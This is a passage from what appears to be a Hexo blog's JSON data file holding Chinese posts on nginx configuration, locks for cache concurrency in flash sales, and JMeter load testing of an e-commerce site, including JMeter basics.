class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http &#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tlog_format upstream_time &apos;$remote_addr - $remote_user [$time_local] &apos;</span><br><span class=\"line\">                             &apos;&quot;$request&quot; $status $body_bytes_sent &apos;</span><br><span class=\"line\">                             &apos;&quot;$http_referer&quot; &quot;$http_user_agent&quot;&apos;</span><br><span class=\"line\">                             &apos;rt=$request_time uct=&quot;$upstream_connect_time&quot; uht=&quot;$upstream_header_time&quot; urt=&quot;$upstream_response_time&quot;&apos;;</span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    \taccess_log /spool/logs/nginx-access.log upstream_time;</span><br><span class=\"line\">    \terror_log logs/error.log warn;</span><br><span class=\"line\">\t\tlisten 80 backlog 4096;</span><br><span class=\"line\">\t\tserver_name example.org www.example.org;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tlocation /images/ &#123;</span><br><span class=\"line\">        \troot /data;</span><br><span class=\"line\">        \tindex index.html;</span><br><span class=\"line\">        \tsendfile   on;</span><br><span class=\"line\">    \t\ttcp_nopush on;</span><br><span class=\"line\">    \t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    \tlocation ~ \\.php &#123;</span><br><span class=\"line\">    \t\tproxy_set_header Host $host;</span><br><span class=\"line\">    \t\tproxy_set_header X-Real-IP $remote_addr;</span><br><span class=\"line\">    \t\tproxy_set_header Accept-Encoding &quot;&quot;;</span><br><span class=\"line\">    \t\tproxy_buffers 16 4k;</span><br><span class=\"line\">    \t\tproxy_buffer_size 2k;</span><br><span class=\"line\">\t\t    proxy_pass http://localhost:8000;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"web服务器\"><a href=\"#web服务器\" class=\"headerlink\" title=\"web服务器\"></a>web服务器</h2><p>http 服务<br>server 虚拟机<br>location 路径<br>listen 监听端口 backlog 堆大小</p>\n<h2 id=\"静态资源\"><a href=\"#静态资源\" class=\"headerlink\" title=\"静态资源\"></a>静态资源</h2><p>location 路径(正则表达式):<br>root 目录<br>index  默认页面</p>\n<p>上传文件设置:<br>sendfile           on;<br>sendfile_max_chunk 1m;</p>\n<h2 id=\"代理\"><a href=\"#代理\" class=\"headerlink\" title=\"代理\"></a>代理</h2><p>针对路径<br>proxy_pass 转发地址<br>proxy_set_header 设置头信息<br>Ｈost 域名<br>X-Real-IP 客户端地址<br>proxy_buffers off/on<br>proxy_buffers 缓存<br>proxy_buffer_size 缓存大小</p>\n<h2 id=\"日志\"><a href=\"#日志\" class=\"headerlink\" title=\"日志\"></a>日志</h2><p>针对主机<br>error_log<br>access_log</p>\n<p>查看监听:<br>netstat -Lan</p>\n"},{"title":"并发情况下锁的使用","date":"2016-02-25T16:00:00.000Z","desc":"缓存 锁","_content":"在[电商面试题](http://binyanbin.github.io/2016/02/18/interview-hishop/)中，我使用了锁来控制并发时的缓存使用。为什么要加锁，因为在并发环境下，一个线程正在修改缓存，另一个线程在读缓存时，缓存数据很可能会被破坏;另外，使用锁可以控制超卖现像。下面我介绍常用的二种锁：读写锁和互斥锁。\n<!-- more -->\n# 读写锁\n缓存一般使用的情况应该是:\n* 只能由一个线程写，但可以多个线程读。\n* 在读操作时，不能同时让其它线程写，在写操作时，不能同时读。\n\n实现以上两种情况的锁称读写锁，读写锁有两种模式。\n* 读模式:可以有多个线程同时占有。\n* 写模式:一次只有一个线程可以占有。\n\n# 互斥锁\n在我面试题的代码中所有操作使用的是互斥锁，即保证lock上的代码同一时刻只被一个线程操作。这么做可以保证在任意时刻只有单个线程访问缓存，做到线程安全，但是这种方式效率并不高。原因如下:\n* 降低读的并发性，降低了系统使用效率。\n* 像限时抢购、秒杀这种高并发场景，应该要支持对不同的抢购商品并发下单，提高下单效率。\n\n# 限时抢购、秒杀并发场景的应用\n1.应为每个商品订单缓存建一个读写锁。\n2.在对商品下单时，应该对该商品加上写模式锁，保证该商品同一时刻只有一个用户下单，不会引起商品超卖。\n3.获取订单缓存数据时，应为该商品加上读模式锁，保证其它线程也可以读到缓存订单数据。\n\n\n\n\n","source":"_posts/lock.md","raw":"---\ntitle: 并发情况下锁的使用\ndate: 2016-2-26\ndesc: 缓存 锁\n---\n在[电商面试题](http://binyanbin.github.io/2016/02/18/interview-hishop/)中，我使用了锁来控制并发时的缓存使用。为什么要加锁，因为在并发环境下，一个线程正在修改缓存，另一个线程在读缓存时，缓存数据很可能会被破坏;另外，使用锁可以控制超卖现像。下面我介绍常用的二种锁：读写锁和互斥锁。\n<!-- more -->\n# 读写锁\n缓存一般使用的情况应该是:\n* 只能由一个线程写，但可以多个线程读。\n* 在读操作时，不能同时让其它线程写，在写操作时，不能同时读。\n\n实现以上两种情况的锁称读写锁，读写锁有两种模式。\n* 读模式:可以有多个线程同时占有。\n* 写模式:一次只有一个线程可以占有。\n\n# 互斥锁\n在我面试题的代码中所有操作使用的是互斥锁，即保证lock上的代码同一时刻只被一个线程操作。这么做可以保证在任意时刻只有单个线程访问缓存，做到线程安全，但是这种方式效率并不高。原因如下:\n* 降低读的并发性，降低了系统使用效率。\n* 像限时抢购、秒杀这种高并发场景，应该要支持对不同的抢购商品并发下单，提高下单效率。\n\n# 限时抢购、秒杀并发场景的应用\n1.应为每个商品订单缓存建一个读写锁。\n2.在对商品下单时，应该对该商品加上写模式锁，保证该商品同一时刻只有一个用户下单，不会引起商品超卖。\n3.获取订单缓存数据时，应为该商品加上读模式锁，保证其它线程也可以读到缓存订单数据。\n\n\n\n\n","slug":"lock","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0lltm000pg2x66j4tc9n0","content":"<p>在<a href=\"http://binyanbin.github.io/2016/02/18/interview-hishop/\">电商面试题</a>中，我使用了锁来控制并发时的缓存使用。为什么要加锁，因为在并发环境下，一个线程正在修改缓存，另一个线程在读缓存时，缓存数据很可能会被破坏;另外，使用锁可以控制超卖现像。下面我介绍常用的二种锁：读写锁和互斥锁。<br><a id=\"more\"></a></p>\n<h1 id=\"读写锁\"><a href=\"#读写锁\" class=\"headerlink\" title=\"读写锁\"></a>读写锁</h1><p>缓存一般使用的情况应该是:</p>\n<ul>\n<li>只能由一个线程写，但可以多个线程读。</li>\n<li>在读操作时，不能同时让其它线程写，在写操作时，不能同时读。</li>\n</ul>\n<p>实现以上两种情况的锁称读写锁，读写锁有两种模式。</p>\n<ul>\n<li>读模式:可以有多个线程同时占有。</li>\n<li>写模式:一次只有一个线程可以占有。</li>\n</ul>\n<h1 id=\"互斥锁\"><a href=\"#互斥锁\" class=\"headerlink\" title=\"互斥锁\"></a>互斥锁</h1><p>在我面试题的代码中所有操作使用的是互斥锁，即保证lock上的代码同一时刻只被一个线程操作。这么做可以保证在任意时刻只有单个线程访问缓存，做到线程安全，但是这种方式效率并不高。原因如下:</p>\n<ul>\n<li>降低读的并发性，降低了系统使用效率。</li>\n<li>像限时抢购、秒杀这种高并发场景，应该要支持对不同的抢购商品并发下单，提高下单效率。</li>\n</ul>\n<h1 id=\"限时抢购、秒杀并发场景的应用\"><a href=\"#限时抢购、秒杀并发场景的应用\" class=\"headerlink\" title=\"限时抢购、秒杀并发场景的应用\"></a>限时抢购、秒杀并发场景的应用</h1><p>1.应为每个商品订单缓存建一个读写锁。<br>2.在对商品下单时，应该对该商品加上写模式锁，保证该商品同一时刻只有一个用户下单，不会引起商品超卖。<br>3.获取订单缓存数据时，应为该商品加上读模式锁，保证其它线程也可以读到缓存订单数据。</p>\n","excerpt":"<p>在<a href=\"http://binyanbin.github.io/2016/02/18/interview-hishop/\">电商面试题</a>中，我使用了锁来控制并发时的缓存使用。为什么要加锁，因为在并发环境下，一个线程正在修改缓存，另一个线程在读缓存时，缓存数据很可能会被破坏;另外，使用锁可以控制超卖现像。下面我介绍常用的二种锁：读写锁和互斥锁。<br>","more":"</p>\n<h1 id=\"读写锁\"><a href=\"#读写锁\" class=\"headerlink\" title=\"读写锁\"></a>读写锁</h1><p>缓存一般使用的情况应该是:</p>\n<ul>\n<li>只能由一个线程写，但可以多个线程读。</li>\n<li>在读操作时，不能同时让其它线程写，在写操作时，不能同时读。</li>\n</ul>\n<p>实现以上两种情况的锁称读写锁，读写锁有两种模式。</p>\n<ul>\n<li>读模式:可以有多个线程同时占有。</li>\n<li>写模式:一次只有一个线程可以占有。</li>\n</ul>\n<h1 id=\"互斥锁\"><a href=\"#互斥锁\" class=\"headerlink\" title=\"互斥锁\"></a>互斥锁</h1><p>在我面试题的代码中所有操作使用的是互斥锁，即保证lock上的代码同一时刻只被一个线程操作。这么做可以保证在任意时刻只有单个线程访问缓存，做到线程安全，但是这种方式效率并不高。原因如下:</p>\n<ul>\n<li>降低读的并发性，降低了系统使用效率。</li>\n<li>像限时抢购、秒杀这种高并发场景，应该要支持对不同的抢购商品并发下单，提高下单效率。</li>\n</ul>\n<h1 id=\"限时抢购、秒杀并发场景的应用\"><a href=\"#限时抢购、秒杀并发场景的应用\" class=\"headerlink\" title=\"限时抢购、秒杀并发场景的应用\"></a>限时抢购、秒杀并发场景的应用</h1><p>1.应为每个商品订单缓存建一个读写锁。<br>2.在对商品下单时，应该对该商品加上写模式锁，保证该商品同一时刻只有一个用户下单，不会引起商品超卖。<br>3.获取订单缓存数据时，应为该商品加上读模式锁，保证其它线程也可以读到缓存订单数据。</p>"},{"title":"jmeter himall电商抢购业务简单测试","date":"2016-05-12T16:00:00.000Z","desc":"jmeter 电商抢购测试","_content":"Jmeter是一款比较好的测试工具，我以[Hishop](http://www.hishop.com.cn/)旗下[Himall](http://www.hishop.com.cn/products/himall/)(多用户商城产品)为例，使用jmeter对电商网站的抢购业务建立一个简单测试方案。\n## [himall](http://www.hishop.com.cn/products/himall/)抢购业务的测试\n测试要求:模拟1000用户同时登陆himall商城，同时购买固定活动商品库存，全部下单完成之后，去验证结果。\n整个测试摸拟过程为:\n* 登陆 \n* 频刷活动商品页面 \n* 下单\n<!-- more -->\n## JMeter设置\n整个测试的结构如下图\n\n![图](/img/jmeter-6.png)\n\n* 线程组:模拟用户的数量\n* 聚合报告:测试的性能数据\n* 查看结果树:具体每个请求的详细信息。\n* 一个事务控件器:定义从登陆到下单的所有http请求\n* HttpCookie管理器:登陆的用户信息在Cookie中，你需要它了保持cookie用户信息\n* 用户定义变量:记录这次测试指定活动的产品ID及库存ID\n\n1.设置模拟用户数1000\n![图](/img/jmeter-7.png)\n\n2.设置商品及库存ID\n![图](/img/jmeter-8.png)\nskuid为库存ID,productid为商品ID。此测试只操作单个库存\n\n3.设置账号数据\n![图](/img/jmeter-9.png)\n准备1000个用户名和账号，以.csv保存，用户名与密码以','隔开。\n\n4.设置登陆请求\n![图](/img/jmeter-10.png)\n设置登陆请求,ip和端口,路径。请求方法:post。重要的是BodyData的内容,其中包括用户名，密码及验证码。\n__CSVRead是一个读csv文件数据的方法。\n第一参数为目录:C:\\Users\\admin\\Desktop\\jmeterdata\\account.csv这是我本地的账户信息文件路径。\n第二参数指你要读第几列数据，列数由0开始。\ncheckCode 验证码验证\nkeep 是否保持登陆\n* 注意:需要在网站代码中注释掉验证环节才可以测试，否则你无法登陆成功。\n\n4.设置活动页面刷新请求\n![图](/img/jmeter-11.png)\n设置刷新活动页面次数.10次20次你随便设吧\n\n![图](/img/jmeter-12.png)\n刷活动设置比较简单，就是一个路径，${productid}代表是你自定义的产品ID,couts是购买数量。\n\n5.设置提交订单请求\n![图](/img/jmeter-13.png)\n定单提交页面也是一个路径，这个请求参数相对较多一些，最重要的是设置好库存ID\nintegral:使用积分,没有为0\ncouponIds:红包ID,没有为空\nskuIds:购买库存ID,${skuid}则是开始配置的库存ID\ncounts:购买数量\ncollpIds:组合购ID，没有为空\nrecieveAddressId:收货地区ID\ninvoiceType:发票类型 0 不要发票 1 增值税发票 2普通发票\n&invoiceTitle:发票抬头,没有为空\ninvoiceContext:发票内容，没有为空\nisCashOnDelivery:是否货到付款\n\n设置完成，你现在可以泡杯茶坐等结果。当然你也可以修改相应相关参数，如摸拟用户数，指定活动页面的刷新次数等，来看看结果会有哪些不同。\n\n","source":"_posts/jmeter-2.md","raw":"---\ntitle: jmeter himall电商抢购业务简单测试\ndate: 2016-5-13\ndesc: jmeter 电商抢购测试\n---\nJmeter是一款比较好的测试工具，我以[Hishop](http://www.hishop.com.cn/)旗下[Himall](http://www.hishop.com.cn/products/himall/)(多用户商城产品)为例，使用jmeter对电商网站的抢购业务建立一个简单测试方案。\n## [himall](http://www.hishop.com.cn/products/himall/)抢购业务的测试\n测试要求:模拟1000用户同时登陆himall商城，同时购买固定活动商品库存，全部下单完成之后，去验证结果。\n整个测试摸拟过程为:\n* 登陆 \n* 频刷活动商品页面 \n* 下单\n<!-- more -->\n## JMeter设置\n整个测试的结构如下图\n\n![图](/img/jmeter-6.png)\n\n* 线程组:模拟用户的数量\n* 聚合报告:测试的性能数据\n* 查看结果树:具体每个请求的详细信息。\n* 一个事务控件器:定义从登陆到下单的所有http请求\n* HttpCookie管理器:登陆的用户信息在Cookie中，你需要它了保持cookie用户信息\n* 用户定义变量:记录这次测试指定活动的产品ID及库存ID\n\n1.设置模拟用户数1000\n![图](/img/jmeter-7.png)\n\n2.设置商品及库存ID\n![图](/img/jmeter-8.png)\nskuid为库存ID,productid为商品ID。此测试只操作单个库存\n\n3.设置账号数据\n![图](/img/jmeter-9.png)\n准备1000个用户名和账号，以.csv保存，用户名与密码以','隔开。\n\n4.设置登陆请求\n![图](/img/jmeter-10.png)\n设置登陆请求,ip和端口,路径。请求方法:post。重要的是BodyData的内容,其中包括用户名，密码及验证码。\n__CSVRead是一个读csv文件数据的方法。\n第一参数为目录:C:\\Users\\admin\\Desktop\\jmeterdata\\account.csv这是我本地的账户信息文件路径。\n第二参数指你要读第几列数据，列数由0开始。\ncheckCode 验证码验证\nkeep 是否保持登陆\n* 注意:需要在网站代码中注释掉验证环节才可以测试，否则你无法登陆成功。\n\n4.设置活动页面刷新请求\n![图](/img/jmeter-11.png)\n设置刷新活动页面次数.10次20次你随便设吧\n\n![图](/img/jmeter-12.png)\n刷活动设置比较简单，就是一个路径，${productid}代表是你自定义的产品ID,couts是购买数量。\n\n5.设置提交订单请求\n![图](/img/jmeter-13.png)\n定单提交页面也是一个路径，这个请求参数相对较多一些，最重要的是设置好库存ID\nintegral:使用积分,没有为0\ncouponIds:红包ID,没有为空\nskuIds:购买库存ID,${skuid}则是开始配置的库存ID\ncounts:购买数量\ncollpIds:组合购ID，没有为空\nrecieveAddressId:收货地区ID\ninvoiceType:发票类型 0 不要发票 1 增值税发票 2普通发票\n&invoiceTitle:发票抬头,没有为空\ninvoiceContext:发票内容，没有为空\nisCashOnDelivery:是否货到付款\n\n设置完成，你现在可以泡杯茶坐等结果。当然你也可以修改相应相关参数，如摸拟用户数，指定活动页面的刷新次数等，来看看结果会有哪些不同。\n\n","slug":"jmeter-2","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llto000qg2x6xttvk66o","content":"<p>Jmeter是一款比较好的测试工具，我以<a href=\"http://www.hishop.com.cn/\" target=\"_blank\" rel=\"external\">Hishop</a>旗下<a href=\"http://www.hishop.com.cn/products/himall/\" target=\"_blank\" rel=\"external\">Himall</a>(多用户商城产品)为例，使用jmeter对电商网站的抢购业务建立一个简单测试方案。</p>\n<h2 id=\"himall抢购业务的测试\"><a href=\"#himall抢购业务的测试\" class=\"headerlink\" title=\"himall抢购业务的测试\"></a><a href=\"http://www.hishop.com.cn/products/himall/\" target=\"_blank\" rel=\"external\">himall</a>抢购业务的测试</h2><p>测试要求:模拟1000用户同时登陆himall商城，同时购买固定活动商品库存，全部下单完成之后，去验证结果。<br>整个测试摸拟过程为:</p>\n<ul>\n<li>登陆 </li>\n<li>频刷活动商品页面 </li>\n<li>下单<a id=\"more\"></a>\n<h2 id=\"JMeter设置\"><a href=\"#JMeter设置\" class=\"headerlink\" title=\"JMeter设置\"></a>JMeter设置</h2>整个测试的结构如下图</li>\n</ul>\n<p><img src=\"/img/jmeter-6.png\" alt=\"图\"></p>\n<ul>\n<li>线程组:模拟用户的数量</li>\n<li>聚合报告:测试的性能数据</li>\n<li>查看结果树:具体每个请求的详细信息。</li>\n<li>一个事务控件器:定义从登陆到下单的所有http请求</li>\n<li>HttpCookie管理器:登陆的用户信息在Cookie中，你需要它了保持cookie用户信息</li>\n<li>用户定义变量:记录这次测试指定活动的产品ID及库存ID</li>\n</ul>\n<p>1.设置模拟用户数1000<br><img src=\"/img/jmeter-7.png\" alt=\"图\"></p>\n<p>2.设置商品及库存ID<br><img src=\"/img/jmeter-8.png\" alt=\"图\"><br>skuid为库存ID,productid为商品ID。此测试只操作单个库存</p>\n<p>3.设置账号数据<br><img src=\"/img/jmeter-9.png\" alt=\"图\"><br>准备1000个用户名和账号，以.csv保存，用户名与密码以’,’隔开。</p>\n<p>4.设置登陆请求<br><img src=\"/img/jmeter-10.png\" alt=\"图\"><br>设置登陆请求,ip和端口,路径。请求方法:post。重要的是BodyData的内容,其中包括用户名，密码及验证码。<br>__CSVRead是一个读csv文件数据的方法。<br>第一参数为目录:C:\\Users\\admin\\Desktop\\jmeterdata\\account.csv这是我本地的账户信息文件路径。<br>第二参数指你要读第几列数据，列数由0开始。<br>checkCode 验证码验证<br>keep 是否保持登陆</p>\n<ul>\n<li>注意:需要在网站代码中注释掉验证环节才可以测试，否则你无法登陆成功。</li>\n</ul>\n<p>4.设置活动页面刷新请求<br><img src=\"/img/jmeter-11.png\" alt=\"图\"><br>设置刷新活动页面次数.10次20次你随便设吧</p>\n<p><img src=\"/img/jmeter-12.png\" alt=\"图\"><br>刷活动设置比较简单，就是一个路径，${productid}代表是你自定义的产品ID,couts是购买数量。</p>\n<p>5.设置提交订单请求<br><img src=\"/img/jmeter-13.png\" alt=\"图\"><br>定单提交页面也是一个路径，这个请求参数相对较多一些，最重要的是设置好库存ID<br>integral:使用积分,没有为0<br>couponIds:红包ID,没有为空<br>skuIds:购买库存ID,${skuid}则是开始配置的库存ID<br>counts:购买数量<br>collpIds:组合购ID，没有为空<br>recieveAddressId:收货地区ID<br>invoiceType:发票类型 0 不要发票 1 增值税发票 2普通发票<br>&amp;invoiceTitle:发票抬头,没有为空<br>invoiceContext:发票内容，没有为空<br>isCashOnDelivery:是否货到付款</p>\n<p>设置完成，你现在可以泡杯茶坐等结果。当然你也可以修改相应相关参数，如摸拟用户数，指定活动页面的刷新次数等，来看看结果会有哪些不同。</p>\n","excerpt":"<p>Jmeter是一款比较好的测试工具，我以<a href=\"http://www.hishop.com.cn/\">Hishop</a>旗下<a href=\"http://www.hishop.com.cn/products/himall/\">Himall</a>(多用户商城产品)为例，使用jmeter对电商网站的抢购业务建立一个简单测试方案。</p>\n<h2 id=\"himall抢购业务的测试\"><a href=\"#himall抢购业务的测试\" class=\"headerlink\" title=\"himall抢购业务的测试\"></a><a href=\"http://www.hishop.com.cn/products/himall/\">himall</a>抢购业务的测试</h2><p>测试要求:模拟1000用户同时登陆himall商城，同时购买固定活动商品库存，全部下单完成之后，去验证结果。<br>整个测试摸拟过程为:</p>\n<ul>\n<li>登陆 </li>\n<li>频刷活动商品页面 </li>\n<li>下单","more":"<h2 id=\"JMeter设置\"><a href=\"#JMeter设置\" class=\"headerlink\" title=\"JMeter设置\"></a>JMeter设置</h2>整个测试的结构如下图</li>\n</ul>\n<p><img src=\"/img/jmeter-6.png\" alt=\"图\"></p>\n<ul>\n<li>线程组:模拟用户的数量</li>\n<li>聚合报告:测试的性能数据</li>\n<li>查看结果树:具体每个请求的详细信息。</li>\n<li>一个事务控件器:定义从登陆到下单的所有http请求</li>\n<li>HttpCookie管理器:登陆的用户信息在Cookie中，你需要它了保持cookie用户信息</li>\n<li>用户定义变量:记录这次测试指定活动的产品ID及库存ID</li>\n</ul>\n<p>1.设置模拟用户数1000<br><img src=\"/img/jmeter-7.png\" alt=\"图\"></p>\n<p>2.设置商品及库存ID<br><img src=\"/img/jmeter-8.png\" alt=\"图\"><br>skuid为库存ID,productid为商品ID。此测试只操作单个库存</p>\n<p>3.设置账号数据<br><img src=\"/img/jmeter-9.png\" alt=\"图\"><br>准备1000个用户名和账号，以.csv保存，用户名与密码以’,’隔开。</p>\n<p>4.设置登陆请求<br><img src=\"/img/jmeter-10.png\" alt=\"图\"><br>设置登陆请求,ip和端口,路径。请求方法:post。重要的是BodyData的内容,其中包括用户名，密码及验证码。<br>__CSVRead是一个读csv文件数据的方法。<br>第一参数为目录:C:\\Users\\admin\\Desktop\\jmeterdata\\account.csv这是我本地的账户信息文件路径。<br>第二参数指你要读第几列数据，列数由0开始。<br>checkCode 验证码验证<br>keep 是否保持登陆</p>\n<ul>\n<li>注意:需要在网站代码中注释掉验证环节才可以测试，否则你无法登陆成功。</li>\n</ul>\n<p>4.设置活动页面刷新请求<br><img src=\"/img/jmeter-11.png\" alt=\"图\"><br>设置刷新活动页面次数.10次20次你随便设吧</p>\n<p><img src=\"/img/jmeter-12.png\" alt=\"图\"><br>刷活动设置比较简单，就是一个路径，${productid}代表是你自定义的产品ID,couts是购买数量。</p>\n<p>5.设置提交订单请求<br><img src=\"/img/jmeter-13.png\" alt=\"图\"><br>定单提交页面也是一个路径，这个请求参数相对较多一些，最重要的是设置好库存ID<br>integral:使用积分,没有为0<br>couponIds:红包ID,没有为空<br>skuIds:购买库存ID,${skuid}则是开始配置的库存ID<br>counts:购买数量<br>collpIds:组合购ID，没有为空<br>recieveAddressId:收货地区ID<br>invoiceType:发票类型 0 不要发票 1 增值税发票 2普通发票<br>&amp;invoiceTitle:发票抬头,没有为空<br>invoiceContext:发票内容，没有为空<br>isCashOnDelivery:是否货到付款</p>\n<p>设置完成，你现在可以泡杯茶坐等结果。当然你也可以修改相应相关参数，如摸拟用户数，指定活动页面的刷新次数等，来看看结果会有哪些不同。</p>"},{"title":"jmeter 基础概念","date":"2016-03-11T16:00:00.000Z","desc":"jmeter 概念","_content":"\n最近做性能优化工作，同时要给自己的工作给一个总结。需要自己弄性能测试及编写性能测试报告。在别人推荐下使用JMeter对项目进行性能测试。JMeter可以进行配置和执行负载测试、性能测试和压力测试的工具。了解一下几个概念:\n* 负载测试: 这类测试使系统或者应用程序在预先设计好的极端场景下测试运行。这类测试用来评估系统或者程序在极端条件下的行为。\n* 性能测试: 这种测试被用来检测系统的性能表现，包括特定情况下，系统的响应能力和稳定性。\n* 压力测试: 这类测试通过载入更多的外部资源，并使系统组件超越其所设定的能力范围,试图使系统挂掉.\n<!-- more -->\nJMeter 的安装非常简单,从官方网站上下载，解压之后即可使用。运行命令在%JMETER_HOME%/bin下,对于 Windows用户来说,命令是jmeter.bat。运行前请检查JMeter的文档,查看是否具备相关的运行条件:JDK的版本要求是否满足.\n## Test Plan配置\n![基本配置](/img/jmeter-1.png)\n进去之后，你会看到Test Plan和WorkBench。这两个块东西没有太多区别，不同的是Test Plan是测试的相关配置，workbench可以帮你创建一个代理服务器帮Test Plan录制测试脚本。\n#### ThreadGroup 线程组\n一个线程组基本上是不同的测试计划元素的组合，它是一个测试计划的核心，它控制着基本核心参数。\n为了创建一个测试计划，首先你不得不去创建一个线程组，配置如下参数:线程数量，过渡时期，循环次数和正常情况或者错误情况下的行为：\n#### Samplers 采样器\n采样器用于发送请求到不同类型的服务器。它们是每一个测试计划的基本要素，一切都围绕这些采样器而工作：采样器执行请求，这些请求产生一个或多个响应，后续将被分析。\n#### Logic Controllers 逻辑控制器\n逻辑控制器允许你配置一个线程组内不同采样器的执行顺序。\n#### Listeners 监听器\n监听器提供不同的方式查看由采样器请求产生的结果。监听器以报表、树型结构、或简明的日志文件的形式分析结果。\n#### Timers 定时器\n定时器来定义请求之间的等待时间。如果不指定，JMeter会一个请求完成后立即执行下一个请求，没有任何等待时间。\n#### Assertions 断言\n断言通过验证采样器请求产生的响应，来验证测试计划的有效性。类似于单元测试断言，用来检测被测试应用程序的响应质量。\n#### Configuration nodes 配置节点\n配置节点可以将不同的参数传递给取样器请求。\n#### Pre processors 前置处理器\n前置处理器在采样器执行前被触发的元素。\n#### Post processors 后置处理器\n后置处理器是取样器被执行后被触发执行的元素。\n\n## WorkBench\n![非测试元素](/img/jmeter-2.png)\nWorkBench可以Add三个Non-test Elements:\n* Http Mirror Server 镜像的服务器\n其实就是一个代理服务器,它把所有接收到的请求原封不动地返回，这样就可以看到发出请求和响应的具体内容了。\n* Http(s) Test Script Recorder 脚本录制器\n也是一个代理服务器,它会把所有接受的请求全部记录到Test Plan配置中,你在测试中可以使用这些录制的脚本。\n\n## 测试计划元素执行顺序\n* 配置节点\n* 前置处理器\n* 定时器\n* 取样器\n* 后置处理器（只在有结果可用情况下执行）\n* 断言（只在有结果可用情况下执行）\n* 监听器（只在有结果可用情况下执行）\n\n## 性能指标\n* Label:定义的HTTP请求名称\n* Samples:表示这次测试中一共发出了多少个请求\n* Average:访问页面的平均响应时间 \n* Min:访问页面的最小响应时间\n* Max:访问页面的最大响应时间\n* Error%:错误的请求的数量/请求的总数\n* Throughpu:每秒完成的请求数\n* KB/Sec:每秒从服务器端接收到的数据量\n* Median:50％的用户响应时间\n* 90%Line:90％的用户响应时间\n* 95%Line:95％的用户响应时间\n* 99%Line:99％的用户响应时间\n时间指标的单位都是毫秒。\n\n## 第一个web性能测试\n我做了一个博客网站首页的性能测试，只设置ThreadGroup,Sampler,Listener三项就可以运行。\n\n#### ThreadGroup设置\n一个性能测试请求负载是基于一个线程组完成的，jmeter中每个测试计划至少需要包含一个线程组。Test Plan右键菜单可新增ThreadGroup(add->Threads->ThreadGroup);\n![ThreadGroup](/img/jmeter-3.png)\n* Number of Threads 线程数:虚拟用户数.一个虚拟用户占用一个进程或线程。\n* Ramp-up Period 准备时长:设置的虚拟用户数需要多长时间全部启动。\n* Loop Count 循环次数：每个线程发送请求的次数。\n\n#### Sample设置\n在ThreadGroup上右键菜单可新增HttpRequest（add->Sampler->HttpRequest).Sampler是与服务器进行交互的单元.一个Sampler通常进行三部分的工作：\n* 向服务器发送请求\n* 记录服务器的响应数据\n* 记录相应时间信息\n![HttpRequest](/img/jmeter-4.png)\n\n#### Listener设置\n脚本的主要部分设置完成后,需要通过某种方式获得性能测试中的测试结果。ThreadGroup上右键菜单可新增Listner（add->Listener->Aggregate Report).\n![HttpRequest](/img/jmeter-5.png)\n我最关心的是我的博客响应时间，数据显示客户的平均响应时间为:337毫秒,99%的用户在1985毫秒内完成，也就不超2秒。最少用户响应时间为149毫秒，最大用户响应时间为5020毫秒\n","source":"_posts/jmeter-1.md","raw":"---\ntitle: jmeter 基础概念\ndate: 2016-3-12\ndesc: jmeter 概念\n---\n\n最近做性能优化工作，同时要给自己的工作给一个总结。需要自己弄性能测试及编写性能测试报告。在别人推荐下使用JMeter对项目进行性能测试。JMeter可以进行配置和执行负载测试、性能测试和压力测试的工具。了解一下几个概念:\n* 负载测试: 这类测试使系统或者应用程序在预先设计好的极端场景下测试运行。这类测试用来评估系统或者程序在极端条件下的行为。\n* 性能测试: 这种测试被用来检测系统的性能表现，包括特定情况下，系统的响应能力和稳定性。\n* 压力测试: 这类测试通过载入更多的外部资源，并使系统组件超越其所设定的能力范围,试图使系统挂掉.\n<!-- more -->\nJMeter 的安装非常简单,从官方网站上下载，解压之后即可使用。运行命令在%JMETER_HOME%/bin下,对于 Windows用户来说,命令是jmeter.bat。运行前请检查JMeter的文档,查看是否具备相关的运行条件:JDK的版本要求是否满足.\n## Test Plan配置\n![基本配置](/img/jmeter-1.png)\n进去之后，你会看到Test Plan和WorkBench。这两个块东西没有太多区别，不同的是Test Plan是测试的相关配置，workbench可以帮你创建一个代理服务器帮Test Plan录制测试脚本。\n#### ThreadGroup 线程组\n一个线程组基本上是不同的测试计划元素的组合，它是一个测试计划的核心，它控制着基本核心参数。\n为了创建一个测试计划，首先你不得不去创建一个线程组，配置如下参数:线程数量，过渡时期，循环次数和正常情况或者错误情况下的行为：\n#### Samplers 采样器\n采样器用于发送请求到不同类型的服务器。它们是每一个测试计划的基本要素，一切都围绕这些采样器而工作：采样器执行请求，这些请求产生一个或多个响应，后续将被分析。\n#### Logic Controllers 逻辑控制器\n逻辑控制器允许你配置一个线程组内不同采样器的执行顺序。\n#### Listeners 监听器\n监听器提供不同的方式查看由采样器请求产生的结果。监听器以报表、树型结构、或简明的日志文件的形式分析结果。\n#### Timers 定时器\n定时器来定义请求之间的等待时间。如果不指定，JMeter会一个请求完成后立即执行下一个请求，没有任何等待时间。\n#### Assertions 断言\n断言通过验证采样器请求产生的响应，来验证测试计划的有效性。类似于单元测试断言，用来检测被测试应用程序的响应质量。\n#### Configuration nodes 配置节点\n配置节点可以将不同的参数传递给取样器请求。\n#### Pre processors 前置处理器\n前置处理器在采样器执行前被触发的元素。\n#### Post processors 后置处理器\n后置处理器是取样器被执行后被触发执行的元素。\n\n## WorkBench\n![非测试元素](/img/jmeter-2.png)\nWorkBench可以Add三个Non-test Elements:\n* Http Mirror Server 镜像的服务器\n其实就是一个代理服务器,它把所有接收到的请求原封不动地返回，这样就可以看到发出请求和响应的具体内容了。\n* Http(s) Test Script Recorder 